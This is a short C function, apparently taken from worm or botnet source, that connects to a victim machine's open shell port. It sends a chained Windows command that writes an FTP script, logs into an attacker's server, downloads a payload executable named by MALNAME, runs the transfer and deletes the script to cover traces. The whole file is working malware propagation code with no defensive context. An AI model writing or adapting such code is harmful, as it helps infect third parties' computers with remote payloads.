int AttackerFTPserver(const char *victim_ip,int port){
	int len;
	int sizeof_sa;
	int ret;
	int opt;

	char cmdstr[0x200];
	char temp[0x200];
	struct sockaddr_in target_ip;
	struct sockaddr_in sa;
	int fd;

	if ((fd=socket(AF_INET,SOCK_STREAM,0)) == -1)
		return 1;

	memset(&target_ip, 0, sizeof(target_ip));
	target_ip.sin_family = AF_INET;
	target_ip.sin_port = htons(port);
	target_ip.sin_addr.s_addr = inet_addr(victim_ip);
	if (target_ip.sin_addr.s_addr == SOCKET_ERROR)
		return 2;
	if (connect(fd, (struct sockaddr*)&target_ip, sizeof(target_ip)) == SOCKET_ERROR)
		return 3;


	sizeof_sa = sizeof(sa);
	getsockname(fd, (struct sockaddr*)&sa, &sizeof_sa);
	
	sprintf(cmdstr, "echo open [serverIP] >> ftp &echo user [user] [passwd] >> ftp &echo binary >> ftp &echo get ");
	sprintf(temp,MALNAME);
	strcat(cmdstr,temp);
	sprintf(temp,".exe >> ftp &echo bye >> ftp &ftp -n -v -s:ftp &del ftp\r\n");
	strcat(cmdstr,temp);
		
	if (send(fd, cmdstr, strlen(cmdstr), 0) <= 0)
		goto closesocket_and_return;
	Sleep(1000);
	
	//Wait 20 seconds for the victim to request the file,
	// Sleep(20000);
	sprintf(cmdstr, "hostip\r\n");
	if (send(fd, cmdstr, strlen(cmdstr), 0) <= 0)
		goto closesocket_and_return;
	Sleep(2000);


	closesocket_and_return:
	if (fd != 0)
		closesocket(fd);
	return 0;
}